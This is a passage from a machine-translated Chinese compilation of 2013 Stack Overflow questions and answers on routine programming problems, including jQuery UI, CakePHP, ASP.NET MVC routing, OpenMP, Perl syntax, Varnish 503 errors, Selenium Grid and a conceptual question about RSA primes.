**[jsFiddle 示例](http://jsfiddle.net/j08691/PaDBk/3/)**

作为[位置状态的文档](http://api.jqueryui.com/position/)，“注意：jQuery UI 不支持定位隐藏元素”。由于您尝试在隐藏元素上使用位置，因此您需要先使其可见。如果您没有使用原始代码的格式在[**此示例**](http://jsfiddle.net/j08691/PaDBk/4/)中完全淡出元素，您可以见证这一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T19:41:18.293

尝试这个 -

```
$('#message').position({ my: "center top", at: "center bottom-12", of: "#header" });
$('#ShowMessageButton').bind("click", function () {
      $('#message').fadeIn(800).delay(1000).fadeOut(1000);
}); 
```

[**小提琴**](http://jsfiddle.net/PaDBk/1/)

# java - 将axis2.war部署到容器中断了客户端对外部axis2 webservices的调用

> ID：16091548
> 
> 赞同：0
> 
> 时间：2013-04-18T19:32:38.117
> 
> 标签：java, axis2, resin

我有几个现有的网络应用程序部署为应用程序容器（树脂）中的独立战争文件。一些使用axis2 jar 文件和axis2 生成的存根文件来调用外部基于SOAP 的Web 服务。在此之前，他们都工作得很好。

我最近将axis2.war 部署到同一个容器以创建Web 服务（与上面提到的客户端代码无关）。

一旦我重新启动应用程序容器，客户端对外部 Web 服务的调用似乎就被我新部署的axis2.war“拦截”了。服务暂时出现在axis2 web 应用程序的“可用服务”页面中，其名称似乎是根据原始外部web 服务名称随机生成的。

这些服务很快就消失了，但结果是我的客户端代码失败并出现 500 错误，因为本地 Axis2.war 不知道如何处理这些请求。

我一直在寻找 2 天，并没有发现任何人遇到类似的事情。我什至不知道如何解释发生了什么，因为我的客户端代码从不引用 localhost 来进行这些 Web 服务调用。我假设这与axis2.war中的某些配置有关？

如果有人对可能发生的事情有任何想法或见解，我将非常感谢任何信息。

谢谢你的帮助

# cakephp - Strict (2048)：CsvImportBehavior::setup() 的声明应该与 ModelBehavior 兼容

> ID：16091549
> 
> 赞同：2
> 
> 时间：2013-04-18T19:32:39.300
> 
> 标签：cakephp, cakephp-2.3, cakedc

我收到以下错误：

```
Strict (2048): Declaration of CsvImportBehavior::setup() should be compatible 
with ModelBehavior::setup(Model $model, $config = Array) 
[APP\Plugin\Utils\Model\Behavior\CsvImportBehavior.php, line 20] 
```

我按照本网站上的教程进行操作：http: [//www.pronique.com/blog/enable-csv-import-all-controllers-models-cakephp-2](http://www.pronique.com/blog/enable-csv-import-all-controllers-models-cakephp-2)

当我导入我的 CSV 文件时，它会给出以下闪存消息：

```
Successfully imported 0 records from Book1.csv 
```

我不明白为什么它不导入，它与错误/警告它的给予有关吗？

我查看了行为内部（第 20 行的 CsvImportBehaviour.php）：`class CsvImportBehavior extends ModelBehavior {`
这在第 20 行没有意义，这只是类声明，所以我向下移动代码并看到以下内容：`public function setup(Model &$Model, $settings = array()) {`- 这在我看来确实是根据标准。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T20:38:44.843

要抑制错误/警告，请尝试：

*   删除`&`之前`$Model`（不需要，因为 Model 是一个对象，因此已经通过*byref*）

*可选*（参见@mark 的评论）：

*   重命名`$Model`为`$model`（小写）

*   重命名`$settings`为`$config`

我不知道不从 CSV 导入记录的原因，这需要您进行调试。

## 备择方案

CakePHP 也有一个`CSV dataSource`作为数据源插件的一部分。

使用它，您可以创建一个模型，而不是使用数据库，而是使用 CSV 文件作为其源。例如，这允许您执行此操作；

```
 $csvData = $this->MyCsvModel->find('all'); 
```

这将返回 CSV 文件中的所有行。`$csvData`通过保存到另一个模型，将其导入您的数据库将很容易实现

链接：

[https://github.com/cakephp/datasources/tree/2.0](https://github.com/cakephp/datasources/tree/2.0) [https://github.com/cakephp/datasources/blob/2.0/Model/Datasource/CsvSource.php](https://github.com/cakephp/datasources/blob/2.0/Model/Datasource/CsvSource.php)

# xcode - NSUTF8StringEncoding 后的字符串问题

> ID：16091555
> 
> 赞同：0
> 
> 时间：2013-04-18T19:32:58.467
> 
> 标签：xcode, json

我尝试从服务器下载 JSON 字符串，但它看起来不应该这样。抱歉这种格式，第一次使用stackoverflow ..

正如您在接收到的字符串和来自 php 的 var_dump 的比较中看到的那样，键的 from`arr[LISTING][<this ones>]`被删除了..所以我进一步的 JSON 解码确实将条目`arr[LISTING][<this one>]`视为一个值，而不是另一个数组子维度

有任何想法吗？

我尝试了什么：

```
NSData *serverRes = [NSURLConnection sendSynchronousRequest:request returningResponse:&response error:&error];
NSString *serverRes_str=[[NSString alloc]initWithData:serverRes encoding:NSUTF8StringEncoding];
NSLog(@"%@",serverRes_str); 
```

这看起来像什么：

```
{"STATUS":{"RESULT":"OK","CODE":205,"INFO":"GET_PROJECTS","AUTHENTICATED":1,"USERID":1,"ACCESS":1000,"SYSTEM_NAME":"Testdatei","SSL":false,"IDENTIFIER":""},"CONTENT":{"GET_PROJECTS":{"COUNT":7,"LISTING":[{"ID":"1","NAME":"Devel","CREATION_DATE":"1357116685","CREATED_BY":"admin","TYPE":"PROJECT","PUBLIC":false,"PRIVAT":false,"ACCESS":3,"THUMBNAIL":""},{"ID":"30","NAME":"p5","CREATION_DATE":"1365866791","CREATED_BY":"admin","TYPE":"PROJECT","PUBLIC":false,"PRIVAT":false,"ACCESS":3,"THUMBNAIL":""},{"ID":"29","NAME":"p4","CREATION_DATE":"1365866785","CREATED_BY":"admin","TYPE":"PROJECT","PUBLIC":false,"PRIVAT":false,"ACCESS":3,"THUMBNAIL":""},{"ID":"28","NAME":"p3","CREATION_DATE":"1365866780","CREATED_BY":"admin","TYPE":"PROJECT","PUBLIC":false,"PRIVAT":false,"ACCESS":3,"THUMBNAIL":""},{"ID":"27","NAME":"p2","CREATION_DATE":"1365866773","CREATED_BY":"admin","TYPE":"PROJECT","PUBLIC":false,"PRIVAT":false,"ACCESS":3,"THUMBNAIL":""},{"ID":"26","NAME":"p1","CREATION_DATE":"1365866767","CREATED_BY":"admin","TYPE":"PROJECT","PUBLIC":false,"PRIVAT":false,"ACCESS":3,"THUMBNAIL":""},{"ID":"4","NAME":"Testimmortals","CREATION_DATE":"1362388820","CREATED_BY":"admin","TYPE":"PROJECT","PUBLIC":false,"PRIVAT":false,"ACCESS":3,"THUMBNAIL":""}]}}} 
```

它应该是什么样子：

```
array(2) {
  ["COUNT"]=>
  int(7)
  ["LISTING"]=>
  array(7) {
    [0]=>
    array(9) {
      ["ID"]=>
      string(1) "1"
      ["NAME"]=>
      string(5) "Devel"
      ["CREATION_DATE"]=>
      string(10) "1357116685"
      ["CREATED_BY"]=>
      string(5) "admin"
      ["TYPE"]=>
      string(7) "PROJECT"
      ["PUBLIC"]=>
      bool(false)
      ["PRIVAT"]=>
      bool(false)
      ["ACCESS"]=>
      int(3)
      ["THUMBNAIL"]=>
      string(92) ""
    }
    [1]=>
    array(9) {
      ["ID"]=>
      string(2) "30"
      ["NAME"]=>
      string(2) "p5"
      ["CREATION_DATE"]=>
      string(10) "1365866791"
      ["CREATED_BY"]=>
      string(5) "admin"
      ["TYPE"]=>
      string(7) "PROJECT"
      ["PUBLIC"]=>
      bool(false)
      ["PRIVAT"]=>
      bool(false)
      ["ACCESS"]=>
      int(3)
      ["THUMBNAIL"]=>
      string(93) ""
    }
    [2]=>
    array(9) {
      ["ID"]=>
      string(2) "29"
      ["NAME"]=>
      string(2) "p4"
      ["CREATION_DATE"]=>
      string(10) "1365866785"
      ["CREATED_BY"]=>
      string(5) "admin"
      ["TYPE"]=>
      string(7) "PROJECT"
      ["PUBLIC"]=>
      bool(false)
      ["PRIVAT"]=>
      bool(false)
      ["ACCESS"]=>
      int(3)
      ["THUMBNAIL"]=>
      string(93) ""
    }
    [3]=>
    array(9) {
      ["ID"]=>
      string(2) "28"
      ["NAME"]=>
      string(2) "p3"
      ["CREATION_DATE"]=>
      string(10) "1365866780"
      ["CREATED_BY"]=>
      string(5) "admin"
      ["TYPE"]=>
      string(7) "PROJECT"
      ["PUBLIC"]=>
      bool(false)
      ["PRIVAT"]=>
      bool(false)
      ["ACCESS"]=>
      int(3)
      ["THUMBNAIL"]=>
      string(93) ""
    }
    [4]=>
    array(9) {
      ["ID"]=>
      string(2) "27"
      ["NAME"]=>
      string(2) "p2"
      ["CREATION_DATE"]=>
      string(10) "1365866773"
      ["CREATED_BY"]=>
      string(5) "admin"
      ["TYPE"]=>
      string(7) "PROJECT"
      ["PUBLIC"]=>
      bool(false)
      ["PRIVAT"]=>
      bool(false)
      ["ACCESS"]=>
      int(3)
      ["THUMBNAIL"]=>
      string(93) ""
    }
    [5]=>
    array(9) {
      ["ID"]=>
      string(2) "26"
      ["NAME"]=>
      string(2) "p1"
      ["CREATION_DATE"]=>
      string(10) "1365866767"
      ["CREATED_BY"]=>
      string(5) "admin"
      ["TYPE"]=>
      string(7) "PROJECT"
      ["PUBLIC"]=>
      bool(false)
      ["PRIVAT"]=>
      bool(false)
      ["ACCESS"]=>
      int(3)
      ["THUMBNAIL"]=>
      string(93) ""
    }
    [6]=>
    array(9) {
      ["ID"]=>
      string(1) "4"
      ["NAME"]=>
      string(13) "Testimmortals"
      ["CREATION_DATE"]=>
      string(10) "1362388820"
      ["CREATED_BY"]=>
      string(5) "admin"
      ["TYPE"]=>
      string(7) "PROJECT"
      ["PUBLIC"]=>
      bool(false)
      ["PRIVAT"]=>
      bool(false)
      ["ACCESS"]=>
      int(3)
      ["THUMBNAIL"]=>
      string(92) ""
    }
  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:41:34.247

你试过 iOS 自带的 JSON 库吗？它有一个非常方便的方法，如下所示：

```
NSArray *responseValues = [responseString JSONValue]; 
```

或者

```
NSDictionary *responseValues = [responseString JSONValue]; 
```

*   您可以将它作为数组或字典获取，因为`JSONValue`方法返回 an `id`，因此您可以适应您收到的任何内容。

您可以在此处找到该库： [https ://github.com/stig/json-framework](https://github.com/stig/json-framework)

希望能帮助到你。

# sitecore - Sitecore 跟踪页面点击次数

> ID：16091557
> 
> 赞同：1
> 
> 时间：2013-04-18T19:33:02.697
> 
> 标签：sitecore, sitecore6, sitecore-dms

我正在 Sitecore 中建立一个网站，我们有一个常见问题页面，其中包含一系列标题以及相关的 div，这些标题在选择时隐藏/取消隐藏。我被要求跟踪这些标题点击，以便我们可以对页面上的常见问题解答项目进行排序。我将如何在 Sitecore Analytics 中存储此点击信息？

我发现了很多关于如何查询 Sitecore 的默认页面加载行为的问题和答案，但是我将如何跟踪特定 div 被查看了多少次？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T20:27:08.237

假设您使用的是 DMS，您应该能够配置与每个标题部分对应的目标。您可能必须在代码中触发目标的完成：

```
if (Sitecore.Analytics.Tracker.IsActive && Sitecore.Analytics.Tracker.CurrentPage != null)
{
        PageEventData eventData = new PageEventData("My Goal Name");
        eventData.Data = "this is some event data.";
        VisitorDataSet.PageEventsRow pageEventsRow = Sitecore.Analytics.Tracker.CurrentPage.Register(eventData);
        Sitecore.Analytics.Tracker.Submit();
} 
```

然后，您只需查看您的报告即可了解每个常见问题解答部分的有效性。

希望这可以帮助。

# javascript - 从外部文件加载外部 json 对象

> ID：16091558
> 
> 赞同：0
> 
> 时间：2013-04-18T19:33:02.687
> 
> 标签：javascript, json, import, external

我已经多次看到这个问题，但解决方案不起作用。在[这个](http://ec2-107-21-104-179.compute-1.amazonaws.com/v/1/financial-organization/accel-partners.js)链接上，有一个无名的 JSON 对象。我正在尝试访问对象中的数据。这是我迄今为止尝试过的：

![chrome 控制台尝试](https://i.stack.imgur.com/IB7vE.png)

$.getJSON 返回不同的错误。我读到添加“＆callback =？” 到 url 将停止“Access-Control-Allow-Origin”错误，该错误有效，但后来我遇到了“Unexpected token:”错误。不过，JSON 数据对我来说看起来是正确的。

我也试过这样做：

```
<!DOCTYPE html>

<html>
    <head>
        <script src="jquery-latest.min.js"
            type="text/javascript"></script>
    </head>
    <body>
    </body>
</html>

<script>
var jsondata = {}

$(document).ready(function() {
    url = //removed to prevent line wrap
    $.getJSON(url + "&callback=?",
       function(data) { jsondata = data; } );
});
</script> 
```

它产生了同样的意外令牌错误。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:37:14.480

您需要将 URL 路径与参数分开`?`，而不是`&`. 服务器不喜欢您的请求，因为它找不到名为`accel-partners.js&callback=`. 但是，它确实知道名为 的资源`accel-partners.js`。

尝试这个：

```
$(document).ready(function() {
    url = //removed to prevent line wrap
    var callback = ???; // Make sure to define your callback here
    $.getJSON(url + "?callback=" + callback,
       function(data) { jsondata = data; } );
}); 
```

# asp.net-mvc - ASP.NET MVC 路由。找不到资源

> ID：16091566
> 
> 赞同：1
> 
> 时间：2013-04-18T19:33:45.210
> 
> 标签：asp.net-mvc, localization, routing

我正在尝试使用路由在我的 ASP.NET MVC 应用程序中实现本地化。

例如： `www.example.com/Home/Index`- 将显示默认文化的内容。 `www.example.com/en/Home/Index`- 将显示英文内容。 `www.example.com/ru/Home/Index`- 俄语等等...

因此，我为每个操作创建了本地化属性：

```
public class LocalizationAttribute : ActionFilterAttribute
{
    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        if (filterContext.RouteData.Values["lang"] != null && !String.IsNullOrWhiteSpace(filterContext.RouteData.Values["lang"].ToString()))
            {
                var lang = filterContext.RouteData.Values["lang"].ToString();
                Thread.CurrentThread.CurrentCulture = CultureInfo.CreateSpecificCulture(lang);
                Thread.CurrentThread.CurrentUICulture =               CultureInfo.CreateSpecificCulture(lang);
            }
            else
            {
                var langHeader = String.Empty;
                langHeader = filterContext.HttpContext.Request.UserLanguages[0];
                Thread.CurrentThread.CurrentCulture =   CultureInfo.CreateSpecificCulture(langHeader);
                Thread.CurrentThread.CurrentUICulture = CultureInfo.CreateSpecificCulture(langHeader);
            }

            base.OnActionExecuting(filterContext);
        }
    } 
```

我将该属性添加到我的控制器中的每个操作中。

并注册路线：

```
public static void RegisterRoutes(RouteCollection routes)
{
    routes.IgnoreRoute("{resource}.axd/{*pathInfo}");

    routes.MapRoute(
           "Localization",
           "{lang}/{controller}/{action}/{id}",
           new { lang = "en-US", controller = "Home", action = "Index", id = UrlParameter.Optional }
            );

    routes.MapRoute(
           "Default",
           "{controller}/{action}/{id}",
                    new { controller = "Home", action = "Index", id = UrlParameter.Optional }
            );

} 
```

导航到`www.example.com/About/Contacts`工作正常。但是当我导航到`www.example.com/en/About/Contacts`或类似的东西时，我得到`404 error`：找不到资源。那么，可能是什么问题？

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T20:17:53.543

通过导航到`www.example.com/en/About/Contacts`您实际上仍在调用默认路由。在这种情况下，两条路线都将匹配，但只会调用最后指定的一条（从上到下）。

因此，当您导航到该 url 时，默认路由将假定以下内容： Controller: en Action: About Id: Contacts

您应该为您的路线添加约束以使其更加具体。或者您可以将“本地化”路由移到“默认”路由下方，这样两者仍然匹配，但在这种情况下，最后一个将是“本地化”。

如果您以后必须解决任何类似问题，我建议您使用 RouteDebugger NuGet 包，它将帮助您了解哪些路由与请求匹配，哪些路由将实际执行以及使用哪些参数.. 这是 Phil Haack 博客条目的链接关于它：[http ://haacked.com/archive/2011/04/12/routedebugger-2.aspx](http://haacked.com/archive/2011/04/12/routedebugger-2.aspx)

# c++ - OpenMP 共享文件处理程序

> ID：16091568
> 
> 赞同：1
> 
> 时间：2013-04-18T19:33:57.193
> 
> 标签：c++, performance, io, openmp

我有一个循环，我使用 OpenMP 将其并行化。在这个循环中，我从文件中读取一个三角形，并对这些数据执行一些操作。这些操作独立于每个三角形到另一个三角形，所以我认为这很容易并行化，只要我将文件的实际读取保持在关键部分。

*   读取三角形的顺序并不重要
*   一些三角形被读取并很快被丢弃，一些需要更多的算法工作（bbox 构造，...）
*   我在做二进制 I/O
*   使用 C++ ifstream *tri_data*
*   我在 SSD 上测试这个

ReadTriangle 调用 file.read() 并从 ifstream 中读取 12 个浮点数。

```
#pragma omp parallel for shared (tri_data)
for(int i = 0; i < ntriangles ; i++) {
    vec3 v0,v1,v2,normal;
#pragma omp critical
    {
        readTriangle(tri_data,v0,v1,v2,normal);
    }
    (working with the triangle here)
} 
```

现在，我观察到的行为是启用 OpenMP 后，整个过程会变慢。我在代码中添加了一些计时器来跟踪在 I/O 方法中花费的时间，以及在循环本身中花费的时间。

没有 OpenMP：

```
Total IO IN time       : 41.836 s.
Total algorithm time   : 15.495 s. 
```

使用 OpenMP：

```
Total IO IN time       : 48.959 s.
Total algorithm time   : 44.61 s. 
```

我的猜测是，由于读取处于临界区，线程只是在等待彼此完成使用文件处理程序，导致等待时间更长。

有关如何解决此问题的任何指示？我的程序将真正受益于处理具有多个进程的读取三角形的可能性。我试过玩弄线程调度和相关的东西，但这在这种情况下似乎没有多大帮助。

由于我正在研究核外算法，因此引入缓冲区来容纳大量三角形并不是一个真正的选择。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-10T20:34:37.807

因此，我提出的解决方案是基于主/从策略，其中：

1.  主线程（线程 0）执行所有 I/O
2.  奴隶对检索到的数据做一些工作

伪代码将如下所示：

```
#include<omp.h>

vector<vec3> v0;
vector<vec3> v1;
vector<vec3> v2;
vector<vec3> normal;

vector<int> tdone;

int nthreads;
int triangles_read = 0;

/* ... */

#pragma omp parallel shared(tri_data)
{
  int id = omp_get_thread_num();
  /*
   * Initialize all the buffers in the master thread.
   * Notice that the size in memory is similar to your example.
   */
#pragma omp single
  {
    nthreads = omp_get_num_threads();
    v0.resize(nthreads);
    v1.resize(nthreads);
    v2.resize(nthreads);
    normal.resize(nthreads);
    tdone.resize(nthreads,1);
  }

  if ( id == 0 ) { // Producer thread

    int next = 1; 
    while( triangles_read != ntriangles ) {
      if ( tdone[next] ) { // If the next thread is free
        readTriangle(tri_data,v0[next],v1[next],v2[next],normal[next]); // Read data and fill the correct buffer
        triangles_read++;
        tdone[next] = 0; // Set a flag for thread next to start working
#pragma omp flush (tdone[next],triangles_read) // Flush it
      }
      next = next%(nthreads - 1) + 1; // Set next
    } // while

  } else { // Consumer threads

    while( true  ) { // Wait for work                  
      if( tdone[id] == 0) {
        /* ... do work here on v0[id], v1[id], v2[id], normal[id] ... */
        tdone[id] == 1;
#pragma omp flush (tdone[id]) // Flush it   
      }      
      if( tdone[id] == 1 && triangles_read == ntriangles) break; // Work finished for all
    }

  }
#pragma omp barrier

} 
```

我不确定这对你是否仍然有价值，但无论如何这是一个不错的预告片！

# asp.net-mvc - RegisterRoutes 和 MvcSiteMapProvider MVC 4

> ID：16091570
> 
> 赞同：0
> 
> 时间：2013-04-18T19:34:02.447
> 
> 标签：asp.net-mvc, asp.net-mvc-routing, mvcsitemapprovider

是否可以在 RegisterRoutes 方法中解析我的 MVC.sitemap 的所有节点？当我尝试时，我只看到根节点（家）。没有孩子……这是我的站点地图。

```
<mvcSiteMap xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns="http://mvcsitemap.codeplex.com/schemas/MvcSiteMap-File-3.0"
        xsi:schemaLocation="http://mvcsitemap.codeplex.com/schemas/MvcSiteMap-File-3.0 MvcSiteMapSchema.xsd"
        enableLocalization="true">

  <mvcSiteMapNode controller="Home" action="Index" resourceKey="home">
    <mvcSiteMapNode controller="Home" action="About" resourceKey="about"/>
    <mvcSiteMapNode controller="Home" action="Contact" resourceKey="contact"/>
  </mvcSiteMapNode>

</mvcSiteMap> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-11T19:45:09.523

这是不支持的。MvcSiteMapProvider 使用请求缓存，直到应用程序启动后才可用。即使我们解决了这个问题，HttpContext 在 IIS 集成模式下也不可用。

此外，您的站点地图应该基于您的路线，而不是相反。

# json - 将 TO_JSON 方法添加到包中真的很奇怪的 perl 语法错误

> ID：16091574
> 
> 赞同：1
> 
> 时间：2013-04-18T19:34:13.233
> 
> 标签：json, perl, cookies, mod-perl

如果我这样做，则将 TO_JSON 方法（通过 JSON.pm 转换为受祝福的引用）添加到 CGI::Cookie 中：

```
package CGI::Cookie;
sub TO_JSON {
    return {
        map { name => $_->name,
              value => $_->value,
              domain => $_->domain,
              path => $_->path,
              expires => $_->expires }
            shift
    }
} 
```

> XXX.pm 第 76 行的语法错误，XXX.pm 第 77 行的“shift”附近的语法错误，“}”附近的（eval 50）第 3 行的 require 编译失败。

但如果我这样做：

```
package CGI::Cookie;
sub TO_JSON {
    return {
        map { ''.'name' => $_->name,
              value => $_->value,
              domain => $_->domain,
              path => $_->path,
              expires => $_->expires }
            shift
    }
} 
```

有用

不能为我的生活弄清楚为什么。同样，仅引用“名称”也无济于事。我*必须*连接一个空字符串才能工作。

我很迷惑。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:50:30.573

当涉及到块和匿名 hashrefs 时，Perl 语法有点模棱两可。当 Perl 无法正确猜测时，您可以强制进行正确解释：

*   **哈希** 引用`+{ ... }`
*   **代码**块**`{; ... }`**

 **强制块后`map`成为代码块解决了这个问题。`shift`以前它认为该块是一个匿名哈希，并且在:之前缺少一个逗号`map`可以是形式`map EXPR, LIST`，并且 hashref 是一个有效的表达式。

* * *

子使用误`map`用将一个元素分配给`$_`. 最好写成：

```
sub TO_JSON {
    my $o = shift; # my $_ should work as well, but that is beside the point
    return +{
       name    => $o->name,
       value   => $o->value,
       domain  => $o->domain,
       path    => $o->path,
       expires => $o->expires,
    };
} 
```

但可以简写为

```
sub TO_JSON {
    my $o = shift;
    return +{
       map { $_ => $o->$_() } qw/name value domain path expires/
    };
} 
```**

# apache - Varnish/Apache 随机 503 错误

> ID：16091575
> 
> 赞同：3
> 
> 时间：2013-04-18T19:34:13.583
> 
> 标签：apache, varnish, http-status-code-503

我在托管大约 30 个网站的 Rackspace 云服务器上运行 cPanel。我正在使用 Varnish 3.0.3 + Apache 2.2.23。我收到随机的 503 错误。如果我重新启动 httpd 进程，它们就会消失。我检查了 Apache error_log，没有看到任何与 503 错误相关的内容。

这是我的清漆配置：

```
backend default {
    .host = "198.61.161.65";
    .port = "8080";
    .connect_timeout = 600s;
    .first_byte_timeout = 600s;
    .between_bytes_timeout = 600s;
    } 
```

这是我的 Varnish 启动参数：

```
-a :80 -f /etc/varnish/default.vcl -T 127.0.0.1:6082 -t 120 -w 1,1000,120 -u varnish -g varnish -S /etc/varnish/secret -p http_max_hdr=256 -p http_resp_hdr_len=8192 -p http_range_support=on -s malloc,768M 
```

我运行了 varnishlog 并记录了一些错误。它们都包含 TxResponse=Service Unavailable 。对我来说，这意味着 Apache 没有及时响应 Varnish 的请求。这是一个例子：

```
17 SessionOpen  c 74.133.75.136 54227 :80
17 ReqStart     c 74.133.75.136 54227 1219297893
17 RxRequest    c GET
17 RxURL        c /
17 RxProtocol   c HTTP/1.1
17 RxHeader     c Host: www.archerytrade.org
17 RxHeader     c User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:20.0) Gecko/20100101 Firefox/20.0
17 RxHeader     c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
17 RxHeader     c Accept-Language: en-US,en;q=0.5
17 RxHeader     c Accept-Encoding: gzip, deflate
17 RxHeader     c DNT: 1
17 RxHeader     c Connection: keep-alive
17 VCL_call     c recv lookup
17 VCL_call     c hash
17 Hash         c /   
17 Hash         c www.archerytrade.org
17 VCL_return   c hash
17 VCL_call     c miss fetch
17 Backend      c 18 default default
17 FetchError   c http first read error: -1 0 (Success)
17 VCL_call     c error deliver
17 VCL_call     c deliver deliver
17 TxProtocol   c HTTP/1.1
17 TxStatus     c 503
17 TxResponse   c Service Unavailable
17 TxHeader     c Server: Varnish
17 TxHeader     c Content-Type: text/html; charset=utf-8
17 TxHeader     c Retry-After: 5
17 TxHeader     c Content-Length: 441
17 TxHeader     c Accept-Ranges: bytes
17 TxHeader     c Date: Wed, 17 Apr 2013 01:39:52 GMT
17 TxHeader     c X-Varnish: 1219297893
17 TxHeader     c Age: 0
17 TxHeader     c Via: 1.1 varnish
17 TxHeader     c Connection: close
17 Length      c 441
17 ReqEnd      c 1219297893 1366162792.398471832 1366162792.541639328 0.000244379 0.143036604 0.000130892
17 SessionClose c error
17 StatSess     c 74.133.75.136 54227 0 1 1 0 0 0 257 441 
```

我尝试将以下内容添加到我的 default.vcl 文件中：

```
sub vcl_recv {
set req.grace = 15s;
...
}

sub vcl_fetch {
if (beresp.status == 500 || beresp.status == 503) {
set beresp.saintmode = 10s;
return(restart);
} 
set beresp.grace = 1h;
...
} 
```

大约在出现 503 错误时，我在 Apache error_log 中发现了 PHP 致命错误、脚本头过早结束和由于可能的配置错误，请求超出了 10 次内部重定向的限制。

我尝试增加/减少 Varnish 的内存和超时值。我尝试添加更高的 http_max_hdr 和 http_resp_hdr_len 值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-03T15:59:45.723

We're using APC on this server, and the allotted memory size was only 96M. After increasing the memory a few times and tracking the usage, we settled on 312M. The cache hit rate is 99.7% and the fragmentation is < 0.2%. The Apache 503 errors have almost completely stopped.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-10-13T10:24:44.957

以下是帮助我解决问题的方法：

执行以下命令后，我知道错误：

```
$ varnishlog -b -q 'FetchError' 
```

错误是“- FetchError http first read error: EOF”，详细信息可以在[清漆网站找到](https://varnish-cache.org/tips/varnishlog/fetcherror.html)

然后在设置“first_byte_timeout”后，问题得到修复：

```
backend default {
  .host = "127.0.0.1";
  .port = "8888";
  .connect_timeout = 1s; # Wait a maximum of 1s for backend connection (Apache, Nginx, etc...)
  .first_byte_timeout = 5s; # Wait a maximum of 5s for the first byte to come from your backend
  .between_bytes_timeout = 2s; # Wait a maximum of 2s between each bytes sent
} 
```

[Varnish 503 解决方案](http://www.technoreply.com/solving-dreaded-varnish-503-error/)的详细信息

# node.js - 在 Selenium Grid 上运行 WebdriverJS 测试

> ID：16091579
> 
> 赞同：4
> 
> 时间：2013-04-18T19:34:26.983
> 
> 标签：node.js, selenium-webdriver, selenium-grid

我有一个在 AmazonEC2 上运行的 Selenium Grid

它由一个运行在端口 7055 上的集线器和一个运行在端口 7056 上的节点组成。

我有以下测试：

```
var webdriver = require('selenium-webdriver'),
    driver = new webdriver.Builder().
       usingServer('http://ec2-50-18-75-182.us-west-1.compute.amazonaws.com:7055/wd/hub').
       withCapabilities({'browserName': 'firefox'}).
       build();

var postTitle = "Post "+(+new Date);

driver.get('http://si-demo.herokuapp.com/posts/new');
driver.findElement(webdriver.By.id('post_name')).sendKeys("Selenium");
driver.findElement(webdriver.By.id('post_title')).sendKeys(postTitle);
driver.findElement(webdriver.By.id('post_content')).sendKeys("This is auto generated by a test");
driver.findElement(webdriver.By.name('commit')).click();
driver.quit(); 
```

当我尝试连接到集线器端口时失败。当我直接连接到节点端口时，测试确实运行。

连接到网格集线器时出现的错误是：

```
timers.js:103
            if (!process.listeners('uncaughtException').length) throw e;
                                                                      ^
Error: ETIMEDOUT connect ETIMEDOUT
    at ClientRequest.sendRequest (/Users/jason/Development/cirrus/spanish-inquisition-runner/node_modules/selenium-webdriver/http/index.js:127:16)
    at ClientRequest.EventEmitter.emit (events.js:96:17)
    at Socket.socketErrorListener (http.js:1436:9)
    at Socket.EventEmitter.emit (events.js:96:17)
    at Socket._destroy.self.errorEmitted (net.js:329:14)
    at process.startup.processNextTick.process._tickCallback (node.js:244:9)
==== async task ====
WebDriver.createSession()
    at Function.webdriver.WebDriver.acquireSession_ (/Users/jason/Development/cirrus/spanish-inquisition-runner/node_modules/selenium-webdriver/lib/webdriver/webdriver.js:130:49)
    at Function.webdriver.WebDriver.createSession (/Users/jason/Development/cirrus/spanish-inquisition-runner/node_modules/selenium-webdriver/lib/webdriver/webdriver.js:109:30)
    at Builder.build (/Users/jason/Development/cirrus/spanish-inquisition-runner/node_modules/selenium-webdriver/builder.js:70:22)
    at Object.<anonymous> (/Users/jason/Development/cirrus/spanish-inquisition-runner/open_canvas.js:5:8)
    at Module._compile (module.js:449:26)
    at Object.Module._extensions..js (module.js:467:10)
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
    at Module.runMain (module.js:492:10) 
```

**我的问题是：** Selenium WebdriverJS 是否支持连接到集线器？如果是这样，我做错了什么？

笔记：

*   我已连接到集线器并成功运行与 rspec 测试相同的步骤。
*   我还能够在 EC2 实例上本地连接到集线器并运行测试，只有在尝试远程连接到网格时才会发生。
*   当查看位于 :7055/grid/console 的 Selenium2 网格控制台时，它似乎确实在节点上使用会话。

我在 EC2 上使用的命令来启动网格：

```
Xvfb :0 -screen 0 1024x768x24 2>&1 >/dev/null &
export DISPLAY=:0
java -jar selenium-server-standalone-2.32.0.jar -port 7055 -role hub
xvfb-run java -jar selenium-server-standalone-2.32.0.jar -role node -hub http://localhost:7055/grid/register 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-07-24T16:24:32.040

您是否尝试过使用远程网络驱动程序？我没有使用过 JS 驱动，但是 C# 有一个用于远程网格连接的特定驱动。

[https://code.google.com/p/selenium/wiki/WebDriverJs#Using_the_Stand-alone_Selenium_Server](https://code.google.com/p/selenium/wiki/WebDriverJs#Using_the_Stand-alone_Selenium_Server)

查看 JS 文档，您在构建驱动程序时可能需要执行以下操作：

```
var webdriver = require('selenium-webdriver'), 
    SeleniumServer = require('selenium-webdriver/remote').SeleniumServer; 
```

# cryptography - 有多少个素数（可用于 RSA 加密）？

> ID：16091581
> 
> 赞同：50
> 
> 时间：2013-04-18T19:34:31.393
> 
> 标签：cryptography, rsa, primes, prime-factoring

我是否错误地认为 RSA 加密的安全性通常受到已知素数数量的限制？

要破解（或创建）私钥，必须组合正确的素数对。

是否不可能发布 RSA 使用范围内所有素数的列表？还是该列表足够大以使这种蛮力攻击不太可能？不会有“常用”的素数吗？

* * *

## 回答 #1

